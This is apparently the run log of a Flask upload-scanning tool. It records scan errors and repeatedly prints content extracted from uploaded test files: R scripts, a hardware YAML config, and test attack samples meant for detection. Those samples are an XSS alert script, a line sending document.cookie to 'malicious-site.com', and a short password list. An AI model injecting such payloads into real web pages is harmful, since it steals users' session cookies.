2025-02-22 21:36:40,742 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: name 'subprocess' is not defined
2025-02-22 21:36:40,743 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,744 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: name 'subprocess' is not defined
2025-02-22 21:36:40,745 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/alpha.jpg: name 'subprocess' is not defined
2025-02-22 21:36:40,746 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: name 'subprocess' is not defined
2025-02-22 21:36:40,747 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: name 'subprocess' is not defined
2025-02-22 21:36:40,748 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: name 'subprocess' is not defined
2025-02-22 21:36:40,749 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: name 'subprocess' is not defined
2025-02-22 21:36:40,750 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: name 'subprocess' is not defined
2025-02-22 21:36:40,751 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,752 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: name 'subprocess' is not defined
2025-02-22 21:36:40,753 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: name 'subprocess' is not defined
2025-02-22 21:36:40,754 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,754 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: name 'subprocess' is not defined
2025-02-22 21:36:40,755 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/alpha.jpg: name 'subprocess' is not defined
2025-02-22 21:36:40,756 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: name 'subprocess' is not defined
2025-02-22 21:36:40,757 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: name 'subprocess' is not defined
2025-02-22 21:36:40,758 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: name 'subprocess' is not defined
2025-02-22 21:36:40,759 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: name 'subprocess' is not defined
2025-02-22 21:36:40,760 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: name 'subprocess' is not defined
2025-02-22 21:36:40,761 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,762 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: name 'subprocess' is not defined
2025-02-22 21:36:40,763 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: name 'subprocess' is not defined
2025-02-22 21:36:40,764 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,765 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: name 'subprocess' is not defined
2025-02-22 21:36:40,766 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/alpha.jpg: name 'subprocess' is not defined
2025-02-22 21:36:40,767 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,768 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:36:40,769 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,770 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,771 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,772 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,773 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:36:40,774 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,775 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,776 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,777 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,778 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:36:40,779 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,780 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,781 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,782 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,783 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:36:40,784 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,784 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,785 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,786 - Error scanning uploads/test/test/2 (copy).yaml: name 'subprocess' is not defined
2025-02-22 21:36:40,787 - Error scanning uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,788 - Error scanning uploads/test/test/45.xml: name 'subprocess' is not defined
2025-02-22 21:36:40,789 - Error scanning uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:36:40,790 - Error scanning uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,791 - Error scanning uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,792 - Error scanning uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,794 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 21:36:40,794 - [33mPress CTRL+C to quit[0m
2025-02-22 21:36:47,212 - 127.0.0.1 - - [22/Feb/2025 21:36:47] "GET / HTTP/1.1" 200 -
2025-02-22 21:37:01,405 - Error scanning uploads/output.jpg: name 'subprocess' is not defined
2025-02-22 21:37:01,409 - 127.0.0.1 - - [22/Feb/2025 21:37:01] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:37:01,412 - 127.0.0.1 - - [22/Feb/2025 21:37:01] "GET / HTTP/1.1" 200 -
2025-02-22 21:37:06,046 - Error scanning uploads/output.jpg: name 'subprocess' is not defined
2025-02-22 21:37:06,049 - 127.0.0.1 - - [22/Feb/2025 21:37:06] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:37:06,053 - 127.0.0.1 - - [22/Feb/2025 21:37:06] "GET / HTTP/1.1" 200 -
2025-02-22 21:39:18,510 - Error scanning uploads/output.jpg: local variable 'file' referenced before assignment
2025-02-22 21:39:18,512 - Error scanning uploads/alpha.jpg: local variable 'file' referenced before assignment
2025-02-22 21:39:18,514 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:39:18,516 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:39:18,518 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:39:18,519 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:39:18,521 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:39:18,522 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,523 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,524 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:39:18,526 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,527 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:39:18,528 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/alpha.jpg: local variable 'file' referenced before assignment
2025-02-22 21:39:18,529 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:39:18,531 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:39:18,532 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:39:18,533 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:39:18,534 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:39:18,535 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,536 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,537 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:39:18,539 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,540 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:39:18,541 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/alpha.jpg: local variable 'file' referenced before assignment
2025-02-22 21:39:18,542 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:39:18,544 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:39:18,545 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:39:18,546 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:39:18,547 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:39:18,548 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,549 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,550 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:39:18,552 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,553 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:39:18,555 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/alpha.jpg: local variable 'file' referenced before assignment
2025-02-22 21:39:18,556 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,557 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,558 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,559 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,560 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,561 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,562 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,563 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,564 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,565 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,566 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,567 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,568 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,569 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,570 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:39:18,571 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:39:18,573 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:39:18,574 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:39:18,575 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:39:18,576 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:39:18,577 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:39:18,578 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:39:18,579 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:39:18,582 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:39:18,583 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:39:18,585 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/alpha.jpg: local variable 'file' referenced before assignment
2025-02-22 21:39:18,586 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
